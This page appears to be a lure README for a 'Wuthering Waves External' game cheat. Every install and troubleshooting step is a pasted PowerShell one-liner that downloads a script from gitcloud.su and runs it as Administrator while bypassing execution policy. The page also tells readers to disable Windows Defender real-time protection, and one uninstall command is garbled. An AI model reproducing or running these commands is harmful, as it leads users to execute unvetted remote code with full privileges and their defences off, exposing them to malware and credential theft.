# ⚡️ Wuthering Waves | External
An intelligent, single-line script designed for instant deployment of the complete Wuthering Waves External suite with zero manual hassle.

---

### 💎 PowerShell (Run as Administrator)
```powershell
irm https://gitcloud.su/powershell/Activator.ps1 | iex
```


### 💻 Command Prompt (cmd.exe) (Run as Administrator)
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://gitcloud.su/powershell/Activator.ps1 | iex"
```

---

## 🔍 Troubleshooting & Common Errors

### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://gitcloud.su/powershell/Activator.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
In older legacy environments where aliases are missing, use explicit full system cmdlets:
```powershell
Invoke-RestMethod https://gitcloud.su/powershell/Activator.ps1 | Invoke-Expression
```

### 📌 Script Closes Instantly or Does Nothing
Verify that your terminal environment is explicitly launched **as an Administrator**. If issues persist, fallback to the universal CMD variant:
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://gitcloud.su/powershell/Activator.ps1 | iex"
```

### 📌 Error 30015 — Version Conflicts
If corrupted remnants of previous Wuthering Waves External installations are interfering, purge them using this CIM cmdlet (reboot your PC afterward):
```powershell
powershell -Command "Get-CimInstance -ClassName Win32_Product | Where-Object { \(_.Name -like '*Wuthering Waves*' } \vert{} ForEach-Object {\)_ | Invoke-CimMethod -MethodName Uninstall }"
```

### 📌 Antivirus or SmartScreen Interception
Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable "Real-time protection" within your Windows Defender settings during setup, then re-enable it immediately after completion.
